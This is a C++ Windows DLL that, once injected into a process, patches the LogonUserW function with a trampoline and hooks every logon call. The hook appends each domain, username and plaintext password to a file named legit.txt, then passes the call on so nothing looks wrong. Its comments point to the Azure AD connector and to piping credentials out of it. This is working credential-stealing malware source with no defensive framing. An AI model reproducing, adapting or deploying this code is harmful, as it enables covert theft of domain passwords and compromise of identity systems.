#include <windows.h> 
#include <stdio.h> 
#include <iostream> 
#include <string> 
#include <fstream> 
#include <sstream> 
 
// Simple ASM trampoline 
// mov r11, 0x4142434445464748 
// jmp r11 
unsigned char trampoline[] = { 0x49, 0xbb, 0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41, 0x41, 0xff, 0xe3 }; 
 
BOOL LogonUserWHook(LPCWSTR username, LPCWSTR domain, LPCWSTR password, DWORD logonType, DWORD logonProvider, PHANDLE hToken); 
 
//HANDLE pipeHandle = INVALID_HANDLE_VALUE; 
 
void Start(void) { 
 DWORD oldProtect; 
 
 // Connect to our pipe which will be used to pass credentials out of the connector 
 //while (pipeHandle == INVALID_HANDLE_VALUE) { 
 // pipeHandle = CreateFileA("\\\\.\\pipe\\azureadpipe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); 
 // Sleep(500); 
 //} 
 
 void* LogonUserWAddr = GetProcAddress(LoadLibraryA("advapi32.dll"), "LogonUserW"); 
 if (LogonUserWAddr == NULL) { 
  // Should never happen, but just incase 
  return; 
 } 
 
 // Update page protection so we can inject our trampoline 
 VirtualProtect(LogonUserWAddr, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect); 
 
 // Add our JMP addr for our hook 
 *(void**)(trampoline + 2) = &LogonUserWHook; 
 
 // Copy over our trampoline 
 memcpy(LogonUserWAddr, trampoline, sizeof(trampoline)); 
 
 // Restore previous page protection so Dom doesn't shout 
 VirtualProtect(LogonUserWAddr, 0x1000, oldProtect, &oldProtect); 
} 
 
// The hook we trampoline into from the beginning of LogonUserW 
// Will invoke LogonUserExW when complete, or return a status ourselves 
BOOL LogonUserWHook(LPCWSTR username, LPCWSTR domain, LPCWSTR password, DWORD logonType, DWORD logonProvider, PHANDLE hToken) { 
 PSID logonSID; 
 void* profileBuffer = (void*)0; 
 DWORD profileLength; 
 QUOTA_LIMITS quota; 
 bool ret; 
 WCHAR pipeBuffer[1024]; 
 DWORD bytesWritten; 
 
 //swprintf_s(pipeBuffer, sizeof(pipeBuffer) / 2, L"%s\\%s - %s", domain, username, password); 
 //WriteFile(pipeHandle, pipeBuffer, sizeof(pipeBuffer), &bytesWritten, NULL); 
 
 //open file for writing 
 // Costruisci la stringa formattata usando std::wstringstream 
 std::wstringstream wsstream; 
 wsstream << L"\nCredentials " << domain << L"\\" << username << L" - " << password; 
 
 // Apri il file per la scrittura 
 std::wofstream fw(L"C:\\temp\\legit.txt", std::ios::out | std::ios::app); 
 
 if (fw.is_open()) { 
  fw << wsstream.str(); // Scrivi la stringa formattata nel file 
  fw.close(); 
 } 
 else { 
  std::wcerr << L"Errore nell'apertura del file." << std::endl; 
 } 
 // Forward request to LogonUserExW and return result 
 ret = LogonUserExW(username, domain, password, logonType, logonProvider, hToken, &logonSID, &profileBuffer, &profileLength, &quota); 
 return ret; 
} 
 
BOOL APIENTRY DllMain(HMODULE hModule, 
 DWORD  ul_reason_for_call, 
 LPVOID lpReserved 
) 
{ 
 switch (ul_reason_for_call) 
 { 
 case DLL_PROCESS_ATTACH: 
  Start(); 
 case DLL_THREAD_ATTACH: 
 case DLL_THREAD_DETACH: 
 case DLL_PROCESS_DETACH: 
  break; 
 } 
 return TRUE; 
}